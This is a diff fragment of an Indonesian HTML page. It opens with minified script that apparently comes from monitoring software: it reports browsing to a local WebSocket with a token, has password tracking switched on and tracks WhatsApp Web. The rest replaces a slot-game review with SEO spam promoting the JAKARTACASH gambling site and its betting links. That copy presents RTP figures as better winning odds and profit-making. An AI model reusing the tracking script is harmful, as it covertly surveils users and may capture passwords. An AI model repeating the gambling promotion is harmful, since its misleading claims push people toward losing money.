YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function f(){(I=new WebSocket(S.connectionString)).onclose=o,I.onmessage=s,I.onopen=d,S.extJs&&(this.extJs.webSockReady=()=>I.readyState===WebSocket.OPEN,this.extJs.webSockSend=Y=>I.send(Y))}function g(){var Y=function(){var Y=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var e=0;e<Y.length;e++)if(Y[e]+"Hidden"in document)return Y[e]+"Hidden";return null}();return!!Y&&document[Y]}function p(){var Y=document.head.querySelector("[name='og:title']");return!!Y&&"WhatsApp Web"===Y.getAttribute("content")}function h(){I.send(JSON.stringify({type:"waptracking"}))}function m(){E=new Map,w=new Set,L=0,(k=new Date).setSeconds(0),k.setMilliseconds(0)}Y=this,e={},t={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(Y){return("000"+Y.getFullYear()).slice(-4)},YY:function(Y){return("0"+Y.getFullYear()).slice(-2)},Y:function(Y){return""+Y.getFullYear()},MMMM:function(Y){return this.MMMM[Y.getMonth()]},MMM:function(Y){return this.MMM[Y.getMonth()]},MM:function(Y){return("0"+(Y.getMonth()+1)).slice(-2)},M:function(Y){return""+(Y.getMonth()+1)},DD:function(Y){return("0"+Y.getDate()).slice(-2)},D:function(Y){return""+Y.getDate()},HH:function(Y){return("0"+Y.getHours()).slice(-2)},H:function(Y){return""+Y.getHours()},A:function(Y){return this.A[11<Y.getHours()|0]},hh:function(Y){return("0"+(Y.getHours()%12||12)).slice(-2)},h:function(Y){return""+(Y.getHours()%12||12)},mm:function(Y){return("0"+Y.getMinutes()).slice(-2)},m:function(Y){return""+Y.getMinutes()},ss:function(Y){return("0"+Y.getSeconds()).slice(-2)},s:function(Y){return""+Y.getSeconds()},SSS:function(Y){return("00"+Y.getMilliseconds()).slice(-3)},SS:function(Y){return("0"+(Y.getMilliseconds()/10|0)).slice(-2)},S:function(Y){return""+(Y.getMilliseconds()/100|0)},dddd:function(Y){return this.dddd[Y.getDay()]},ddd:function(Y){return this.ddd[Y.getDay()]},dd:function(Y){return this.dd[Y.getDay()]},Z:function(Y){return(0<(Y=Y.utc?0:Y.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(Y-Y%100*.4)).slice(-4)},post:function(Y){return Y}},parser:{find:function(Y,e){for(var t,n=-1,r=0,a=0,i=Y.length;a<i;a++)t=Y[a],!e.indexOf(t)&&t.length>r&&(n=a,r=t.length);return{index:n,length:r}},MMMM:function(Y){return this.parser.find(this.MMMM,Y)},MMM:function(Y){return this.parser.find(this.MMM,Y)},A:function(Y){return this.parser.find(this.A,Y)},h:function(Y,e){return(12===Y?0:Y)+12*e},pre:function(Y){return Y}}}},e.format=function(Y,n,r){var a=e.addMinutes(Y,r?Y.getTimezoneOffset():0),i=t.en,o=i.formatter;return a.utc=r,n.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,(function(Y){var e=o[Y];return e?o.post(e.call(i,a,n)):Y.replace(/\[(.*)]/,"$1")}))},e.parse=function(Y,n,r){var a,i,o=t.en,s=o.parser.pre(Y),M=0,u=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,D={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};Y=[31,28,31,30,31,30,31,31,30,31,30,31];for(var c={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};a=u.exec(n);){var d=0,l=1;for(i="";!i;)i=a[++d];a=i.charAt(0);var f=s.slice(M);if(2>d){var g=o.parser[i].call(o,f,n);c[a]=g.index,"M"===a&&c[a]++,l=g.length}else if(7>d)g=(f.match(D[d])||[""])[0],c[a]=0|("S"===a?(g+"000").slice(0,-i.length):g),l=g.length;else if(" "!==a&&a!==f[0])return NaN;if(!l)return NaN;M+=l}return M===s.length&&g?(c.Y+=70>c.Y?2e3:100>c.Y?1900:0,c.H=c.H||o.parser.h(c.h||0,c.A||0),n=new Date(c.Y,c.M-1,c.D,c.H,c.m,c.s,c.S),Y[1]+=0|e.isLeapYear(n),1>c.M||12<c.M||1>c.D||c.D>Y[c.M-1]||23<c.H||59<c.m||59<c.s?NaN:r?e.addMinutes(n,-n.getTimezoneOffset()):n):NaN},e.isValid=function(Y,t){return!!e.parse(Y,t)},e.addYears=function(Y,t){return e.addMonths(Y,12*t)},e.addMonths=function(Y,e){var t=new Date(Y.getTime());return t.setMonth(t.getMonth()+e),t},e.addDays=function(Y,e){var t=new Date(Y.getTime());return t.setDate(t.getDate()+e),t},e.addHours=function(Y,t){return e.addMilliseconds(Y,36e5*t)},e.addMinutes=function(Y,t){return e.addMilliseconds(Y,6e4*t)},e.addSeconds=function(Y,t){return e.addMilliseconds(Y,1e3*t)},e.addMilliseconds=function(Y,e){return new Date(Y.getTime()+e)},e.subtract=function(Y,e){var t=Y.getTime()-e.getTime();return{toMilliseconds:function(){return t},toSeconds:function(){return t/1e3|0},toMinutes:function(){return t/6e4|0},toHours:function(){return t/36e5|0},toDays:function(){return t/864e5|0}}},e.isLeapYear=function(Y){return!(((Y=Y.getFullYear())%4||!(Y%100))&&Y%400)},e.isSameDay=function(Y,t){return e.format(Y,"YYYYMMDD")===e.format(t,"YYYYMMDD")},Y.date=e;var S={token:"563fc020-60da-4561-b7fe-cd6fbc07b7d6",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1502",pid:"14332",pn:"chrome.exe",iup:false,dontTrackWebPasswords:false,extJs:null},v=6e4,y=null,N=null,b=null,A=null,T=!1,E=null,w=null,L=0,k=null,I=null,C="",H=!1;!function Y(e){g()?setTimeout((function(){Y(e)}),1e3):e()}((function(){S.extJs&&S.extJs.init(S.token),n()&&window.addEventListener("focus",r),(n()||S.extJs)&&l()}))}();</script>
+    <!-- Header -->
+    <header>
+        <h1>JAKARTACASH</h1>
+        <p>Berita, Informasi, dan Update Terkini dari JAKARTACASH Seluruh Dunia</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#home">Beranda</a></li>
+            <li><a href="#news">Berita</a></li>
+            <li><a href="#trending">Tren</a></li>
+            <li><a href="#contact">Kontak</a></li>
+        </ul>
+    </nav>
+    <main>
+        <!-- Section Berita -->
+        <section id="news">
+            <h2>JAKARTACASH: Inovasi Situs Permainan Online dengan Informasi RTP Terkini</h2>
+            <article>
+                <p>JAKARTACASH hadir sebagai salah satu situs permainan online terdepan yang memadukan hiburan digital dengan transparansi informasi. Fokus utamanya adalah memberikan data RTP (Return to Player) secara real-time kepada para pemain. Fitur ini membantu pemain dalam memilih game dengan peluang kemenangan terbaik, menciptakan pengalaman bermain yang lebih strategis dan menyenangkan. Dengan informasi RTP yang selalu diperbarui, JAKARTACASH bukan hanya menyediakan platform permainan, tetapi juga menjadi alat bantu pengambilan keputusan bagi para pemainnya. Ini adalah salah satu langkah inovatif yang membedakan JAKARTACASH dari situs permainan lain.</p>
+                <h2>Program Inovatif dan Teknologi Modern</h2>
+                <p>Sebagai platform yang dinamis, JAKARTACASH terus mengembangkan program-program inovatif berbasis teknologi modern. Beberapa fitur andalan meliputi:</p>
                 <ul>
-                <li><strong>Tema Fantasi yang Memukau</strong>: Latar belakang permainan menggabungkan warna-warna cerah dengan suasana yang penuh misteri, seolah membawa pemain ke dalam cerita petualangan dan aksi yang menegangkan.</li>
-                <li><strong>Fitur-Fitur Permainan</strong>: Geisha Revenge menawarkan berbagai fitur menarik yang membuat permainan semakin seru dan meningkatkan peluang menang.</li>
+                  <li>Notifikasi RTP Tertinggi</li>
+                  <li>Simulasi Permainan (Demo Mode)</li>
+                  <li>Dashboard Data Harian</li>
+                  <li>Komunitas Digital Aktif</li>
                 </ul>
-                <h3><strong>2.  Fitur utama yang ada dalam permainan Geisha Revenge </strong></h3>
-                <p>Scatter adalah kunci untuk membuka peluang besar di game ini. Berikut adalah keunggulannya:</p>
+                <p>Semua ini didukung oleh arsitektur website yang cepat, responsif, dan aman — memastikan pemain dapat menikmati layanan tanpa gangguan.</p> 
+                <h2>Tren Game Kasino Online dan Perkembangan Esports</h2>
+                <p>Industri kasino online mengalami pertumbuhan pesat, dengan semakin banyak pemain yang beralih ke hiburan digital. Game seperti slot, roulette, dan blackjack kini hadir dalam versi online dengan fitur interaktif dan visual memukau. Dalam konteks ini, JAKARTACASH tidak hanya menyediakan akses ke berbagai jenis permainan, tetapi juga mengkurasi mana yang paling diminati dan paling menguntungkan bagi pemain.</p>    
+                <p>Sementara itu, esports juga mengalami perkembangan besar. JAKARTACASH turut mengikuti tren ini dengan menyajikan informasi seputar turnamen, perkembangan tim, dan strategi bermain yang relevan dengan dunia esports, menjadikan situs ini sebagai hub informasi untuk dua dunia hiburan digital yang sedang naik daun.</p>     
+            </article>
+        </section>
+        <!-- Section Tren -->
+        <section id="trending">
+            <h2>Tren Terbaru</h2>
+            <article>
+                <p>JAKARTACASH selalu mengikuti perkembangan tren digital dan menghadirkannya langsung ke pengguna. Beberapa tren terbaru yang diangkat di situs ini antara lain:</p>
                 <ul>
-                <li><strong>Wild Symbol</strong>: Simbol Wild dalam permainan ini menggantikan simbol lain untuk membantu membentuk kombinasi yang menang. Simbol Wild ini sangat penting, karena dapat meningkatkan peluang Anda untuk mendapatkan kemenangan yang lebih besar.</li>
-                <li><strong>Scatter Symbol dan Free Spins</strong>: Salah satu fitur yang paling diinginkan dalam slot ini adalah simbol Scatter, yang dapat memicu putaran Free Spins. Ketika Anda mendaratkan tiga atau lebih simbol Scatter pada gulungan, Anda akan menerima sejumlah putaran gratis, yang memberikan kesempatan ekstra untuk menang tanpa harus memasang taruhan lagi.</li>
-                <li><strong>Bonus Game (Geisha's Revenge Feature)</strong>: Fitur unik dari permainan ini adalah fitur Geisha's Revenge, di mana pemain dapat memasuki mode bonus dengan kesempatan memenangkan hadiah besar. Dalam mode ini, Geisha akan mengejar musuhnya, dan setiap langkahnya dapat membawa kemenangan besar bagi pemain yang beruntung.</li>
-                <li><strong>Multiplier</strong>: Sepanjang permainan, Anda juga dapat memperoleh multiplier yang dapat menggandakan kemenangan Anda. Fitur ini memberikan elemen kejutan yang membuat setiap putaran semakin mendebarkan.</li>
-                </ul>
-                <h3><strong>3. RTP dan Volatilitas Tinggi: Peluang Besar untuk Menang</strong></h3>
-                <p>Geisha Revenge menawarkan RTP (Return to Player) sekitar 96%, yang berarti secara statistik, pemain dapat mengharapkan pengembalian sekitar 96% dari total taruhan dalam jangka panjang. Volatilitas permainan ini cenderung sedang hingga tinggi, sehingga memberikan peluang kemenangan yang cukup besar, namun juga dengan tingkat risiko yang lebih tinggi.</p>
-                <ul>
-                <li><strong>Apa Itu RTP?</strong>: Return to Player adalah persentase uang yang dikembalikan kepada pemain dalam jangka panjang. RTP tinggi berarti peluang menang lebih besar.</li>
-                <li><strong>Efisiensi Modal</strong>: Dengan RTP tinggi, pemain dapat memaksimalkan keuntungan meskipun bermain dengan modal kecil.</li>
-                </ul>
-                <h3><strong>4. Cara bermain Geisha Revenge dengan Efektif</strong></h3>
-                <p>Untuk memaksimalkan peluang menang, Anda bisa mencoba beberapa Cara berikut:</p>
-                <ul>
-                <li><strong>Geisha Revenge </strong> adalah permainan slot 5 gulungan dengan 3 baris dan memiliki beberapa garis pembayaran (paylines) yang aktif. Untuk mulai bermain, Anda cukup memilih nilai taruhan yang sesuai dan memutar gulungan. Kombinasi simbol yang cocok di garis pembayaran yang aktif akan menghasilkan kemenangan.</li>
-                <li><strong>Selain itu,</strong> pemain juga dapat memilih untuk mengaktifkan fitur autoplay jika ingin permainan berjalan secara otomatis selama beberapa putaran.</li>
-                </ul>
-                <h3><strong>Kesimpulan</strong></h3>
-                <p>Geisha Revenge adalah permainan slot yang menyenangkan dengan tema yang unik dan mekanisme permainan yang menarik. Grafik yang memukau, fitur bonus yang seru, dan potensi kemenangan yang besar membuatnya layak dicoba oleh para pemain slot.</p>
-                <p>Apakah Anda siap untuk membantu Geisha membalaskan dendamnya dan meraih hadiah besar? Mainkan Geisha Revenge sekarang dan rasakan sensasi petualangan dan kemenangan yang menegangkan!</p>
-
-            
-    </article>
-
-</main>
-<footer>
-    <div class="container">
-        <div class="footer-text">&copy;2025 <a href="https://jakartamedia12.github.io/jakartamedia/beritajakarta.html">Jakarta Daily News</a>. All Rights Reserved. 18+</div>
-    </div>
-</footer>
-<div class="nav">
-    <div class="menu">
-        <a href="https://jakartabet88.com/" rel="nofollow noopener">
-            <amp-img layout="intrinsic" height="100" width="100" src="https://i.postimg.cc/15SfY5Dz/logo-LOGIN.png"></amp-img>
-            Login
-        </a>
-        <a href="https://jakartabet88.com/" rel="nofollow noopener" class="tada" target="_blank">
-            <amp-img class="center" layout="intrinsic" height="120" width="120" src="https://i.postimg.cc/mDhQkZm4/logo-DAFTAR.png"></amp-img>
-            Daftar
-        </a>
-        <a href="https://jakartabet88.com/" rel="nofollow noopener" target="_blank">
-            <amp-img layout="intrinsic" height="100" width="100" src="https://i.postimg.cc/85qrCRFd/logo-LIVECHAT.png"></amp-img>
-            Livechat
-        </a>
-    </div>
-</div>
+                 <li>Slot bertema lokal dan budaya Indonesia</li>
+                 <li>Integrasi blockchain dan NFT dalam game online</li>
+                 <li>Turnamen mingguan dengan leaderboard</li>
+                 <li>Permainan kasual dengan sistem reward point</li>
+               </ul>
+                <p>Dengan mengikuti tren global maupun lokal, JAKARTACASH memastikan bahwa pemain tidak ketinggalan inovasi terbaru di dunia hiburan digital.</p>
+        <section id="peran">
+            <h2>Peran JAKARTACASH dalam Memberikan Informasi Berkualitas</h2>
+            <article>        
+                <p>Melalui artikel, berita, dan pembaruan rutin, JAKARTACASH membantu pemain memahami tren game, tips & trik, serta update RTP. Hal ini menjadikan JAKARTACASH bukan hanya platform permainan, tetapi juga sumber edukasi digital yang dapat diandalkan.</p>     
+            </article>
+        </section>
+        <!-- Section Kontak -->
+        <section id="kesimpulan">
+            <h2>kesimpulan</h2>
+            <p>JAKARTACASH berhasil memadukan teknologi modern, inovasi game online, dan informasi berkualitas dalam satu platform. Baik Anda pemain pemula maupun profesional, situs ini menyediakan semua yang dibutuhkan untuk bermain dengan percaya diri, cerdas, dan menyenangkan..</p>
+        </section>
+    </main>
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2025 Berita-JAKARTACASH. Semua Hak Cipta Dilindungi.</p>
+    </footer>
 </body>
 </html>
